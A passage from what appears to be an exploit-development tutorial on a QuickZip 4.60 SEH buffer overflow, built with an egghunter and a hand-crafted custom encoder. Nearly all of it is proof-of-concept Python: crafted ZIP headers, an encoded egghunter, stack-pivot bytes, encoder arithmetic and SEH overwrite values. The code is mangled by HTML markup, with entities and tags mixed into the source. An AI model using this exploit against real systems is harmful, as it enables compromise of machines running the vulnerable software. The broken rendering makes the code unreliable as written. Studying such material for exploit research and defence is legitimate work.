</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># add eax, 0x70707070</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># add eax, 0x20202070</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                  <span class="c"># push eax;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s update the exploit code and run it.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/20.writing%20bytes%201.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/20.writing%20bytes%201.png" alt="image" /></a></p>

<p>Fantastic, we have successfully set the value we need in the EAX and pushed it onto the stack, what has actually written the instructions we need!</p>

<p>Let&rsquo;s do the same for all remaining bytes.</p>

<p>After all that maths, the updated PoC should look as follows:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span>
</span><span class='line'><span class="n">jump_offset</span> <span class="o">=</span> <span class="mi">92</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfencode</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">bufferregister</span><span class="o">=</span><span class="n">eax</span> <span class="o">-</span><span class="n">i</span> <span class="n">egghunter</span><span class="o">-</span><span class="n">wow64</span><span class="o">.</span><span class="n">bin</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">146</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x37</span>\<span class="n">x51</span>\<span class="n">x5a</span>\<span class="n">x6a</span>\<span class="n">x41</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x41</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x6b</span>\<span class="n">x41</span>\<span class="n">x41</span>\<span class="n">x51</span>\<span class="n">x32</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x32</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x30</span>\<span class="n">x42</span>\<span class="n">x42</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x38</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x75</span>\<span class="n">x4a</span>\<span class="n">x49</span>\<span class="n">x66</span>\<span class="n">x51</span>\<span class="n">x49</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x52</span>\<span class="n">x73</span>\<span class="n">x53</span>\<span class="n">x63</span>\<span class="n">x62</span>\<span class="n">x73</span>\<span class="n">x36</span>\<span class="n">x33</span>\<span class="n">x4e</span>\<span class="n">x53</span>\<span class="n">x6f</span>\<span class="n">x30</span>\<span class="n">x75</span>\<span class="n">x36</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6d</span>\<span class="n">x51</span>\<span class="n">x59</span>\<span class="n">x5a</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x36</span>\<span class="n">x6f</span>\<span class="n">x72</span>\<span class="n">x62</span>\<span class="n">x71</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x4a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x66</span>\<span class="n">x46</span>\<span class="n">x56</span>\<span class="n">x38</span>\<span class="n">x74</span>\<span class="n">x73</span>\<span class="n">x78</span>\<span class="n">x49</span>\<span class="n">x4c</span>\<span class="n">x4b</span>\<span class="n">x4b</span>\<span class="n">x64</span>\<span class="n">x61</span>\<span class="n">x74</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x47</span>\<span class="n">x63</span>\<span class="n">x31</span>\<span class="n">x4e</span>\<span class="n">x50</span>\<span class="n">x5a</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x77</span>\<span class="n">x75</span>\<span class="n">x53</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x79</span>\<span class="n">x38</span>\<span class="n">x38</span>\<span class="n">x52</span>\<span class="n">x57</span>\<span class="n">x36</span>\<span class="n">x50</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x33</span>\<span class="n">x44</span>\<span class="n">x6c</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x59</span>\<span class="n">x6a</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x32</span>\<span class="n">x55</span>\<span class="n">x38</span>\<span class="n">x64</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x70</span>\<span class="n">x75</span>\<span class="n">x6b</span>\<span class="n">x51</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6b</span>\<span class="n">x4f</span>\<span class="n">x79</span>\<span class="n">x77</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="n">jump_offset</span><span class="p">)</span>   <span class="c"># padding for nSEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offset</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">by</span> <span class="mh">0x62C</span> <span class="n">to</span> <span class="n">start</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">a</span> <span class="n">controlled</span> <span class="n">area</span> <span class="n">of</span> <span class="n">memory</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x54</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push esp;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x58</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x2d</span>\<span class="n">x07</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x0101072D</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop esp;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Write</span> <span class="n">instructions</span> <span class="k">for</span><span class="p">:</span> <span class="n">push</span> <span class="n">esp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span><span class="p">;</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="n">jmp</span> <span class="n">eax</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0x909090e0 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x70707070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x20202070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xffdeadbe into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77777777</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x37</span>\<span class="n">x25</span>\<span class="n">x57</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77572537</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x11</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x11101110</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xef2d5854 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x43</span>\<span class="n">x47</span>\<span class="n">x1c</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x771c4743</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77011010</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x10</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01100101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for the rest of encoder&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># nSEH: jno $-99; jo $-99   =&gt; &amp;lsquo;9b&amp;rsquo; will actually be converted to &amp;lsquo;a2&amp;rsquo;, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># SEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span 